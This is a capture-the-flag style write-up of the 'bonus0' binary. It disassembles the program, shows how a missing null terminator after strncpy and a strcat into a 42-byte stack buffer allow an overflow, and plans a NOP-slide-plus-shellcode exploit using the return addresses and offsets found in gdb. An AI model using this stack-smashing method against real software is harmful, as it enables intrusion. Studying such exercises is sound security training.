so let's try to launch the first bonus0

└─$ ./bonus0                     
 - 
a
 - 
a
a a


so is take two element from the stdin and make in concatenation of the two string


so let's decmpile the function and watch wats is inside :

inside you have two function 

P and PP

so inside the main is juste call the pp 


push    ebp
mov     ebp, esp
and     esp, 4294967280
sub     esp, 64
lea     eax, [esp+22]
mov     [esp], eax      ; dest
call    pp
lea     eax, [esp+22]
mov     [esp], eax      ; s
call    _puts
mov     eax, 0
leave
retn

is make a stack of 64 octet 
and create  a buffer of 64 - 22 = 42 octet 

after is put the buffer to the first argument of the function pp

and call function pp 

after call function pp is get the buffer at esp+22 and call puts




let's show wat's the function pp 
public pp
pp proc near

var_3C= dword ptr -3Ch
src= byte ptr -30h
var_1C= byte ptr -1Ch
dest= dword ptr  8

; __unwind {
push    ebp
mov     ebp, esp
push    edi
push    ebx
sub     esp, 50h

is create a stack of 80 octet 


after is call two time the function p with twot argument
the first argument is a pointer to string " - " 
the second arugment is a pointer to the buffer of size 28 - 48  = 20


mov     dword ptr [esp+4], offset s ; " - "
lea     eax, [ebp-48]
mov     [esp], eax      ; dest
call    p


first argument is the same of the last
the second arugment is the size 28 

mov     dword ptr [esp+4], offset s ; " - "
lea     eax, [ebp-28]
mov     [esp], eax      ; dest
call    p



after is make a copy of the buffer of the frist call of p and 
put the restulat inside the buffer of argument of the function 
so is buffer in the main stack so the buffer of the 
dest is 42 octet and the src is 20 octet

lea     eax, [ebp-48]
mov     [esp+4], eax    ; src
mov     eax, [ebp+8]
mov     [esp], eax      ; dest
call    _strcpy





mov     ebx, offset unk_80486A4
mov     eax, [ebp+8]          ; eax = make the start of the buffer here is the main buffer of 42 octet
mov     dword ptr [ebp-60], 0FFFFFFFFh
mov     edx, eax              ; edx = buf put the buffer inside edx
mov     eax, 0                ; AL = 0 -> find the first instance of \0
mov     ecx, [ebp-60]         ; ecx = 0xFFFFFFFF init  compte
mov     edi, edx              ; edi = buffer start position
repne scasb


repne scasb get octet by octet from  EDI,
 decrement ECX each iteration, 
 and stop when AL (== '\0') other when ECX is 0.

after :
EDI is point to  '\0' (buf + len + 1),

ECX as the value after the decreemntation


mov     eax, ecx
not     eax
sub     eax, 1
add     eax, [ebp+8]
movzx   edx, word ptr [ebx]
mov     [eax], dx

is get the value of the len
not eax → eax = ~ECX_final
sub eax, 1 → eax = ~ECX_final - 1

add     eax, [ebp+8]
eax = buf + len

read 2 octet and write 2octet inside the addr 


  *(_WORD *)&dest[strlen(dest)] = 'ESPACE \0';

so is call strct with thwo argument src and dest
the first argument is the buffer ins the stack of main of 42octet
the second argument is the the second call of p and the buffer is 28 octet


lea     eax, [ebp-28]
mov     [esp+4], eax    ; src
mov     eax, [ebp+8]
mov     [esp], eax      ; dest
call    _strcat

actually i have big security issue here because 28 + 20 = 48 octet of p get from stdin
but the buffer inside the stack is only of 42 octet !! so i write more than 6 octet ! i think is exploitatiobn here


and for finish is juste the prolog to reset the value of the register
add     esp, 80
pop     ebx
pop     edi
pop     ebp
retn
; } // starts at 804851E
pp endp










function P
p juste get  buffer from the stdin and 
let's watch wat's is inside 

public p
p proc near

buf= byte ptr -1008h
dest= dword ptr  8
s= dword ptr  0Ch

; __unwind {
push    ebp
mov     ebp, esp
sub     esp, 4120
mov     eax, [ebp+s]
mov     [esp], eax      ; s
call    _puts
mov     dword ptr [esp+8], 4096 ; nbytes
lea     eax, [ebp+buf]
mov     [esp+4], eax    ; buf
mov     dword ptr [esp], 0 ; fd
call    _read
mov     dword ptr [esp+4], 10 ; c
lea     eax, [ebp+buf]
mov     [esp], eax      ; s
call    _strchr
mov     byte ptr [eax], 0
lea     eax, [ebp+buf]
mov     dword ptr [esp+8], 14h ; n
mov     [esp+4], eax    ; src
mov     eax, [ebp+dest]
mov     [esp], eax      ; dest
call    _strncpy
leave
retn
; } // starts at 80484B4
p end


i juste get from stdin 4096 element and get the \n and replace with 0 after is copy 20 element from the buffer in parameter
and put inside the dest 


char *__cdecl p(char *dest, char *s)
{
  char buf[4104]; // [esp+10h] [ebp-1008h] BYREF

  puts(s);
  read(0, buf, 0x1000u);
  *strchr(buf, 10) = 0;
  return strncpy(dest, buf, 20u);
}


so how to exploit actually the problem is in p function why ? 
because the strncpy copy n here 20 caracter from the input is ok right ?
yes but if you look little more close ins the man you watch this 


CAVEATS
       The name of these functions is confusing.  These functions produce a null-padded character sequence, not
       a string (see string_copying(7)).  For example:

           strncpy(buf, "1", 5);       // { '1',   0,   0,   0,   0 }
           strncpy(buf, "1234", 5);    // { '1', '2', '3', '4',   0 }
           strncpy(buf, "12345", 5);   // { '1', '2', '3', '4', '5' }
           strncpy(buf, "123456", 5);  // { '1', '2', '3', '4', '5' }


so if the buffer is 20 octet is juste take 20 element and put inside but not put the \0 in the end !!

is a big mistake because actually is i put exactly 20 element from the source the \0 not put inside and is concate the next buffer


so when is want to concat is concate too much 
buffer First Call p Not null terminate + buffer second call of p with null terminate 

and concate with the seconde buffer call of P


P1 + P2 + ESPACE + P2 

But this is really too big actually 

20octet + 20octet + 1 octet + 20octet

and the buffer result is only of 42 octet inside the stack !

so is really easy to overridth the eip pointer in the stack 


so to create the buffer the idea is to store a shellcode inside the buffer inside the buffer of p becauseis really big 4104
but because you use it two time the solution is to make a padding of 100 nop slide juste before the shellcode
for the res you just need to point the eip inside the addr of the buffer 

so let's start

for the first arg1
NOP SLIDE * 100 + SHELLCODE

for the second arg2
offset * 16 + ADDR SHELLCODE


so yo need to now the addr of the buffer

   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]

break *p+28


(gdb) ni
0x080484d6 in p ()
(gdb) x/wx $eax
0xbfffe680:     0x00000000
(gdb) 


so the addr of the buffer is 0xbfffe680
- Choose an address between 0xbfffe680 + 61 (0xbfffe6bd)
         and 0xbfffe680 + 100 (0xbfffe6e4)  


a chose a middle like + 80 0xbfffe6d0



gef➤  pattern search $eip
[+] Searching for '61616561'/'61656161' with period=4
[+] Found at offset 14 (little-endian search) likely

in x86
gef➤  pattern search 0x64616161
[+] Searching for '61616164'/'64616161' with period=4
[+] Found at offset 9 (little-endian search) likely
gef➤ 

so the end of the 9 element after the end of the last buffer

9 + 4 + 7


